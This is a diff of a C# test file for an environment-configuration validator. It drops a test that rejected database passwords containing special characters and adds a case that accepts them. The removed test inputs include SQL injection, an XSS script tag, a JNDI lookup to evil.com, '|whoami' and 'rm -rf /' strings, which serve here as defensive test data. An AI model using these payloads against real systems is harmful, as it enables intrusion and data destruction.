@@ -460,6 +460,7 @@ public class EnvironmentValidatorTests
 
     #region DatabasePassword Tests
 
+    [TestCase("a-zA-Z0-9!@#$%^&*()_+-=[]{}|;':\",./<>?~`")] // all allowed characters
     [TestCase("password123")]
     [TestCase("MySecurePassword")]
     [TestCase("P@ssw0rd!")]
@@ -483,42 +484,6 @@ public class EnvironmentValidatorTests
         // Assert
         result.IsValid.ShouldBeTrue();
         result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseUserPassword)).ShouldBeEmpty();
-    }
-
-    [TestCase("pass'word")]
-    [TestCase("pass\"word")]
-    [TestCase("pass;word")]
-    [TestCase("pass<word")]
-    [TestCase("pass>word")]
-    [TestCase("pass&word")]
-    [TestCase("pass|word")]
-    [TestCase("pass`word")]
-    [TestCase("pass$word")]
-    [TestCase("'; DROP TABLE users; --")]
-    [TestCase("\" OR 1=1 --")]
-    [TestCase("<script>alert('xss')</script>")]
-    [TestCase("${jndi:ldap://evil.com/a}")]
-    [TestCase("|whoami")]
-    [TestCase("`rm -rf /`")]
-    public void Validate_PasswordsWithDangerousCharacters_ShouldFail(string password)
-    {
-        // Arrange
-        var config = new EnvironmentConfiguration(null,
-            null,
-            null,
-            null,
-            password,
-            null,
-            null);
-
-        // Act
-        var result = _validator.Validate(config);
-
-        // Assert
-        result.IsValid.ShouldBeFalse();
-        var passwordErrors = result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseUserPassword));
-        passwordErrors.ShouldNotBeEmpty();
-        passwordErrors.First().ErrorMessage.ShouldBe("DatabaseUserPassword contains invalid characters");
     }
 
     [TestCase("short")]
@@ -611,7 +576,6 @@ public class EnvironmentValidatorTests
         result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabasePort)).ShouldNotBeEmpty();
         result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseName)).ShouldNotBeEmpty();
         result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseUserName)).ShouldNotBeEmpty();
-        result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseUserPassword)).ShouldNotBeEmpty();
     }
 
     [Test]
